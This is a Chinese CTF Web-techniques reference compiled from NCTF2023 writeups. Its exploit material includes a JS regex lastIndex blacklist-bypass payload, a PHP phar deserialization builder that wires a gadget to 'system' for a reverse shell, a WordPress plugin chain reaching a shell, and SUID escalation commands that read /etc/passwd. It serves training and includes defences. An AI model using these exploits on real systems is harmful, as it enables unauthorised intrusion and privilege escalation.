# CTF Web 方向通用技巧

> 关键词:CTF,Web,正则绕过,lastIndex,phar反序列化,WordPress插件,反序列化链,任意文件读取,SUID提权,上传绕过,代码审计
> 本文件提炼自 NCTF2023 Writeup 及通用 Web CTF 经验,按"思路→手法→示例"组织,便于 RAG 检索与实战复用。

## 一、JS 正则黑名单绕过(`g` 标志 lastIndex 状态)

### 原理

JavaScript 正则对象在 `g`(或 `y`)标志下,`test()`/`exec()` 会持久化 `lastIndex` 属性:
- 每次匹配从 `lastIndex` 开始,成功后 `lastIndex` 移到匹配末尾;
- 匹配失败时 `lastIndex` 重置为 0。

因此**同一正则对象连续调用 `test()` 会真假交替**:第一次返回 true(推进 lastIndex),第二次仍从上次位置尝试,若失败返回 false 并重置。这使"用 `test()` 判断是否命中黑名单"的过滤逻辑可被绕过——攻击者触发两次判断,第二次即放行。

### 利用要点

1. 触发**两次 `test()` 调用**:常见于"先校验后使用"的流程(如 ban 后查询、注册后登录)。
2. 配合**异常路径阻止正则更新**:若黑名单正则对象在 `try_catch` 中更新,构造报错(如传对象而非字符串)可让正则停留在上一次状态,进一步扩大可利用窗口。
3. 对象 vs 数组:`ban_username: {"a":"b"}` 这类对象在字符串拼接/正则匹配时行为与数组不同,可作报错触发器。

### 示例(NCTF2023 Wait What?)

```json
{"username":"user","password":"user","ban_username":{"a":"b"}}
```

先调用 ban 接口触发异常使黑名单正则失效,再用 admin 身份请求 flag,第二次请求即可绕过。

### 防御视角

- 正则过滤后不要复用带 `g` 标志的对象做多次判断;每次判断用新正则或重置 `lastIndex = 0`。
- 对输入做类型校验(必须是字符串),拒绝对象/数组传入。
- 黑名单过滤仅作辅助,配合白名单与语义校验。

## 二、phar 反序列化(构造与触发)

### 原理

PHP 中 `phar://` 协议读取 phar 归档时,**读取元数据(metadata)会触发对该对象的反序列化**,无需显式调用 `unserialize()`。触发函数包括:`file_exists`、`file_get_contents`、`fopen`、`is_dir`、`getimagesize` 等文件操作函数。

### 构造 phar(PHP 脚本)

```php
<?php
class WP_HTML_Token
{
  public $on_destroy;
  public $bookmark_name;
  public function __construct()
  {
    $this->on_destroy = "system";
    $this->bookmark_name = "反弹shell命令";
  }
}
@unlink("phar.phar");
$phar = new Phar("phar.phar");          // 后缀名必须为 .phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");  // stub
$o = new WP_HTML_Token();
$phar->setMetadata($o);                 // 自定义对象进 manifest,触发反序列化
$phar->addFromString("test.txt", "test");
$phar->stopBuffering();
```

注意:
- PHP 配置 `phar.readonly` 需为 0 才能写 phar;
- 上传时可改后缀(如 .jpg)绕过后缀检查,`phar://` 触发时按 phar 格式解析;
- 利用链目标类是目标程序里存在的类(魔术方法 `__wakeup`/`__destruct` 等)。

### 触发与利用

```php
// 任意文件读取点传 phar 路径
file_get_contents("phar://uploads/x.jpg/test.txt");
// 或 file_exists / fopen / getimagesize 等
```

### 防御视角

- 将 `phar.readonly` 置 1;禁用 `phar://` 协议(`stream_wrapper_unregister('phar')`)。
- 所有文件操作路径做白名单校验,禁止用户控制协议头。
- 相关:05-应急响应/WebShell与后门排查.md、01-渗透测试/Web渗透测试.md。

## 三、WordPress 插件漏洞链思路

WordPress 站点渗透的通用分析路径(来自 ez_wordpress 题):

1. **版本指纹**:识别 WP 与插件版本(Wappalyzer、`/wp-json/`、readme.txt、页面源码);对比官方最新版差异(题目给 6.4.1 而官网 6.4.2 → 找修复点)。
2. **版本对比找补丁**:下载两版源码 diff,`6.4.2 修了两个反序列化点` → 定位 `call_user_func` 等危险调用,还原反序列化链。
3. **插件发现**:插件扫描记录/`/wp-content/plugins/` 目录枚举;本题发现 `all-in-one-video-gallery` 插件。
4. **CVE 检索**:已知插件版本 → 查 CVE/Exploit-DB;本题 `dl` 参数任意文件读取。
5. **上传点**:找可上传插件(如 drag-and-drop-multiple-file-upload-contact-form-7,见 Exploit-DB 48520),上传 phar 载荷。
6. **串联**:任意文件读取(`phar://`)触发 phar 反序列化 → 执行命令 → 反弹 shell。
7. **提权**:拿 shell 后查 SUID(`find / -perm -4000 -type f`),用可提权命令(如 `date`)提权读 flag。

### SUID 提权速查

```bash
find / -perm -4000 -type f 2>/dev/null          # 找 SUID 文件
find / -perm -4000 -o -perm -2000 -type f       # SUID+SGID
# 常见可提权 SUID 命令:date、find、vim、bash、python、perl、cp、awk 等
# 例(date 支持 -f 读文件执行):
date -f /etc/passwd
# 若 date 以 root 运行,可用其执行文件参数拿到 shell 或读文件
```

提权前提:目标命令为 root 属主且带 SUID 位,且版本存在可利用行为(如 `find` 的 `-exec`、`vim` 的 `:!sh`、`awk` 的 `system()`)。

## 四、其他 Web 高频考点自查

| 考点 | 快速思路 | 关联文档 |
| --- | --- | --- |
| 代码审计入口 | 入口文件→参数→危险函数(SQL/命令/文件/反序列化) | 01-渗透测试/Web渗透测试.md |
| 反序列化链 | 找魔术方法→pop 链→Gadget(如 call_user_func) | 01-渗透测试/Web渗透测试.md |
| 任意文件读取 | 参数遍历、`php://filter`、`phar://`、路径穿越 | 01-渗透测试/Web渗透测试.md |
| 上传绕过 | 后缀黑/白名单、MIME、双写、`.htaccess`、图片马 | 01-渗透测试/Web渗透测试.md |
| 模板注入(SSTI) | 测 `{{7*7}}`、探测引擎、读配置/命令执行 | 01-渗透测试/Web渗透测试.md |
| SSRF | 内网探测、`file://`、gopher 打内网服务 | 01-渗透测试/Web渗透测试.md |
| 逻辑漏洞 | 越权、支付/状态篡改、验证码复用、并发竞态 | 01-渗透测试/Web渗透测试.md |

## 合规声明

所有手法仅在授权靶标(CTF 题目环境、授权渗透测试)内使用;未授权利用属违法行为。
